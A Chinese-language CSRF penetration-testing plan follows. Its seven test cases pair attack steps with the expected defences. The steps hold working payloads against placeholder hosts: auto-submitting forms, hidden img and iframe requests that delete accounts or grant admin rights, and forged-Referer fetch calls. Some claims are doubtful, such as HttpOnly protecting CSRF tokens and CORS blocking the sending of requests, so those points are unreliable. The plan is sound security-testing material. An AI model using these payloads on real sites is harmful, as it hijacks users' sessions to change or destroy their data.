以下为针对 **CSRF（跨站请求伪造）** 渗透测试设计的详细测试用例，严格遵循测试步骤与期望结果一一对应的格式：

---

### **测试用例 1：基础CSRF漏洞检测**  
**测试步骤**  
[1] 登录目标系统（如用户A账户），捕获修改邮箱的POST请求  
[2] 构造恶意HTML页面，包含自动提交表单：  
```html
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>document.forms[0].submit();</script>
```
[3] 用户A在未退出的情况下访问该页面  
[4] 检查用户A的绑定邮箱是否被修改  

**期望结果**  
[1] 捕获的请求中包含CSRF Token或验证机制  
[2] 恶意页面无法成功提交修改请求  
[3] 用户访问恶意页面时系统要求重新认证  
[4] 用户邮箱保持原值未变更  

---

### **测试用例 2：Token防护机制绕过测试**  
**测试步骤**  
[1] 获取有效CSRF Token（从正常请求中提取）  
[2] 构造攻击页面：  
```html
<img src="https://target.com/delete-account?csrftoken=STOLEN_TOKEN" width="0" height="0">
```
[3] 尝试复用同一Token多次提交敏感操作  
[4] 测试空Token/无效Token：`csrftoken=` 或 `csrftoken=INVALID_VALUE`  

**期望结果**  
[1] Token无法被外部页面直接获取（HttpOnly）  
[2] 图片标签请求被拒绝（GET请求不执行写操作）  
[3] Token仅限单次使用或短期有效  
[4] 无效Token触发401错误并记录安全事件  

---

### **测试用例 3：同源策略与Referer检查**  
**测试步骤**  
[1] 构造跨域攻击页面（托管在evil.com）  
[2] 删除Referer头：  
```html
<meta name="referrer" content="no-referrer">
```
[3] 伪造合法Referer：  
```javascript
fetch('https://target.com/transfer', {
  method: 'POST',
  headers: {'Referer': 'https://target.com/legit-page'},
  body: 'amount=1000&to=attacker'
})
```
[4] 测试子域名绕过：`Referer: https://sub.target.com`  

**期望结果**  
[1] 跨域请求被CORS策略拦截  
[2] 缺失Referer头的请求被拒绝  
[3] 伪造Referer被识别（服务端验证完整域名）  
[4] 子域名请求需显式授权（主域≠子域）  

---

### **测试用例 4：JSON API与特殊方法检测**  
**测试步骤**  
[1] 构造伪造的JSON请求：  
```html
<script>
fetch('/api/update-profile', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{"role":"admin"}'
})
</script>
```
[2] 尝试方法覆盖：  
```html
<form action="/delete-user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
```
[3] 测试GET方式执行写操作：  
`<img src="https://target.com/grant-admin?userid=attacker">`  

**期望结果**  
[1] JSON请求要求自定义头（如X-Requested-With）  
[2] 方法覆盖需显式启用（默认禁用）  
[3] GET请求永不修改数据（返回405错误）  

---

### **测试用例 5：多步骤操作链式攻击**  
**测试步骤**  
[1] 捕获"转账"流程：  
  - 步骤1：创建交易（生成交易Token）  
  - 步骤2：确认交易（提交Token）  
[2] 构造恶意页面自动提交两步请求  
[3] 尝试跳过确认步骤直接提交交易  
[4] 复用步骤1的Token执行未授权交易  

**期望结果**  
[1] 每个步骤使用独立Token  
[2] 确认步骤需人工交互（禁用自动提交）  
[3] 缺失中间步骤的请求被拒绝  
[4] Token绑定会话+操作类型（无法复用）  

---

### **测试用例 6：防护机制深度验证**  
**测试步骤**  
[1] 检查Cookie的SameSite属性：  
```Set-Cookie: session=abc; SameSite=Lax; Secure```  
[2] 验证敏感操作的双因素认证  
[3] 测试登录态过期时间（≤30分钟）  
[4] 检查关键操作密码确认机制  

**期望结果**  
[1] 会话Cookie设置SameSite=Lax/Strict  
[2] 资金/权限变更需2FA确认  
[3] 无操作15分钟后自动登出  
[4] 密码确认使用独立验证通道  

---

### **测试用例 7：文件操作CSRF检测**  
**测试步骤**  
[1] 构造恶意页面上传文件：  
```html
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="malware">
  <input type="hidden" name="filename" value="virus.exe">
</form>
<script>document.forms[0].submit()</script>
```
[2] 测试删除文件：  
`<iframe src="https://target.com/delete-file?id=123"></iframe>`  

**期望结果**  
[1] 文件上传需交互式选择（禁用自动提交）  
[2] 文件操作接口要求CSRF Token  
[3] 删除操作返回确认提示（非直接执行）  

---

### **防护标准验证矩阵**
| 防护措施         | 通过标准                          | 验证方法              |
| ---------------- | --------------------------------- | --------------------- |
| CSRF Token       | 每个表单/API请求包含随机Token     | 删除Token观察是否拒绝 |
| SameSite Cookie  | 会话Cookie设置SameSite=Lax+Secure | 检查Set-Cookie响应头  |
| 关键操作二次验证 | 改密/支付需密码或2FA确认          | 尝试绕过验证步骤      |
| Referer检查      | 严格校验来源域名                  | 伪造/删除Referer头    |
| 操作日志         | 记录所有敏感操作                  | 检查管理员审计日志    |

> **测试工具**：  
> - Burp Suite：`Generate CSRF PoC` 一键生成攻击页面  
> - OWASP ZAP：自动扫描CSRF漏洞  
> - 浏览器控制台：检查`Network`标签的请求头完整性  
> - Cookie Editor：修改SameSite属性测试降级攻击